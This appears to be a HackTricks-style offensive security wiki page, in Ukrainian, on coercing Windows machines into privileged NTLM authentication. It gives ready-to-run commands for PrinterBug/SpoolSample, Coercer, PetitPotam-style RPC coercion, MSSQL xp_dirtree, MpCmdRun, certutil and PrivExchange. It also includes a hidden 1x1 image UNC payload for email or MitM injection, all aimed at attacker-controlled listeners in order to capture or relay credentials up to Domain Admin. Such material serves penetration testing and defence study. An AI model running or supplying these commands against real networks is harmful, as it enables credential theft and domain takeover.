# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) — це **collection** **remote authentication triggers**, написана на C# за допомогою MIDL compiler для уникнення залежностей від 3rd party.

## Зловживання службою Spooler

Якщо службу _**Print Spooler**_ **увімкнено,** можна використати вже відомі облікові дані AD, щоб **запросити** у print server Domain Controller **оновлення** щодо нових завдань друку та просто вказати йому **надіслати сповіщення до певної системи**.\
Зверніть увагу: коли printer надсилає сповіщення довільній системі, йому потрібно **автентифікуватися проти** цієї **системи**. Отже, attacker може змусити службу _**Print Spooler**_ автентифікуватися проти довільної системи, і служба **використає обліковий запис комп’ютера** під час цієї автентифікації.

Під капотом класична primitive **PrinterBug** зловживає **`RpcRemoteFindFirstPrinterChangeNotificationEx`** через **`\\PIPE\\spoolss`**. Спочатку attacker відкриває handle принтера/сервера, а потім передає фальшиве ім’я клієнта в `pszLocalMachine`, щоб target spooler створив канал сповіщень **назад до host, контрольованого attacker’ом**. Саме тому результатом є **outbound authentication coercion**, а не пряме виконання коду.<sup>[[2]](#references)</sup>\
Якщо ви шукаєте **RCE/LPE** безпосередньо у spooler, перегляньте [PrintNightmare](printnightmare.md). Ця сторінка присвячена **coercion і relay**.

### Пошук Windows-серверів у домені

За допомогою PowerShell отримайте список Windows-систем. Сервери зазвичай мають пріоритет, тому зосередимося на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Пошук служб Spooler, що прослуховують

За допомогою дещо модифікованого [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) від @mysmartlogin (Vincent Le Toux) перевірте, чи прослуховує порт Spooler Service:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати `rpcdump.py` у Linux і шукати протокол **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Або швидко перевірте хости з Linux за допомогою **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Якщо ви хочете **виявити coercion surfaces**, а не лише перевірити, чи існує spooler endpoint, використовуйте **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Це корисно, оскільки бачити endpoint в EPM означає лише те, що print RPC interface зареєстрований. Це **не** гарантує, що кожен метод coercion доступний із вашими поточними привілеями або що хост ініціює придатний для використання автентифікаційний потік.

### Попросити сервіс автентифікуватися на довільному хості

Ви можете скомпілювати [SpoolSample звідси](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використайте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте в Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
За допомогою **Coercer** можна безпосередньо націлитися на інтерфейси spooler і не вгадувати, який метод RPC доступний:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Примусове використання HTTP замість SMB через WebClient

Класичний PrinterBug зазвичай спричиняє автентифікацію **SMB** до `\\attacker\share`, що все ще корисно для **capture**, **relay до HTTP targets** або **relay, коли підписування SMB відсутнє**.\
Однак у сучасних середовищах **relay з SMB до SMB** часто блокується через **SMB signing**, тому оператори зазвичай надають перевагу примусовій автентифікації через **HTTP/WebDAV**.

Якщо на цілі запущена служба **WebClient**, слухач можна вказати у формі, яка змушує Windows використовувати **WebDAV через HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Це особливо корисно під час chaining з **`ntlmrelayx --adcs`** або іншими HTTP relay targets, оскільки усуває залежність від можливості SMB relay у примусово встановленому з’єднанні. Важливе застереження: для роботи HTTP/WebDAV variant на victim має бути запущено **WebClient**.

### Combining with Unconstrained Delegation

Якщо attacker уже скомпрометував computer з [Unconstrained Delegation](unconstrained-delegation.md), він може **змусити printer автентифікуватися на цьому computer**. Через unconstrained delegation **TGT** **computer account printer** буде **збережено в** **пам’яті** computer з unconstrained delegation. Оскільки attacker уже скомпрометував цей host, він зможе **отримати цей ticket** і використати його ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: асинхронний print interface у тому самому spooler pipe; використовуйте Coercer для перелічення доступних методів на певному host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (також через \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Примітка: ці методи приймають параметри, які можуть містити UNC path (наприклад, `\\attacker\share`). Під час обробки Windows автентифікується (у контексті machine/user) до цього UNC, що дає змогу захоплювати або relay-ити NetNTLM.\
Для spooler abuse **MS-RPRN opnum 65** залишається найпоширенішим і найкраще документованим primitive, оскільки специфікація протоколу прямо вказує, що server створює notification channel назад до client, указаного в `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN через \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target намагається відкрити вказаний шлях до backup log і автентифікується до UNC, контрольованого attacker.<sup>[[1]](#references)</sup>
- Practical use: примусити Tier 0 assets (DC/RODC/Citrix/etc.) передати NetNTLM, а потім relay-ити його до AD CS endpoints (сценарії ESC8/ESC11) або інших privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Attack `PrivExchange` є результатом flaw, виявленої у feature **Exchange Server `PushSubscription`**. Ця feature дає змогу змусити Exchange server будь-яким domain user з mailbox автентифікуватися до host, наданого client, через HTTP.

За замовчуванням **Exchange service працює як SYSTEM** і має надмірні privileges (зокрема, **WriteDacl privileges на domain до Cumulative Update 2019**). Цю flaw можна exploit-нути, щоб увімкнути **relaying information до LDAP**, а згодом extract-нути domain NTDS database. Якщо relay до LDAP неможливий, цю flaw усе одно можна використати для relay та автентифікації до інших host у domain. Успішна exploitation цієї attack надає негайний доступ до Domain Admin за наявності будь-якого автентифікованого domain user account.

## Inside Windows

Якщо ви вже перебуваєте всередині Windows machine, можна змусити Windows підключитися до server, використовуючи privileged accounts, за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використайте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використати certutil.exe lolbin (двійковий файл із підписом Microsoft), щоб примусово ініціювати NTLM-аутентифікацію:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Через email

Якщо ви знаєте **email-адресу** користувача, який входить у систему на машині, яку ви хочете скомпрометувати, ви можете просто надіслати йому **email із зображенням 1x1**, наприклад
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
і коли він відкриє його, він спробує автентифікуватися.

### MitM

Якщо ви можете виконати MitM-атаку на комп’ютер і впровадити HTML у сторінку, яку він переглядатиме, ви можете спробувати впровадити на сторінку зображення, як наведене нижче:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Інші способи примусово ініціювати та виманити NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Злам NTLMv1

Якщо ви можете перехопити [виклики NTLMv1, прочитайте тут, як їх зламати](../ntlm/index.html#ntlmv1-attack).\
_Пам’ятайте, що для злому NTLMv1 потрібно встановити challenge Responder у значення "1122334455667788"_

## Посилання

- [1] [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
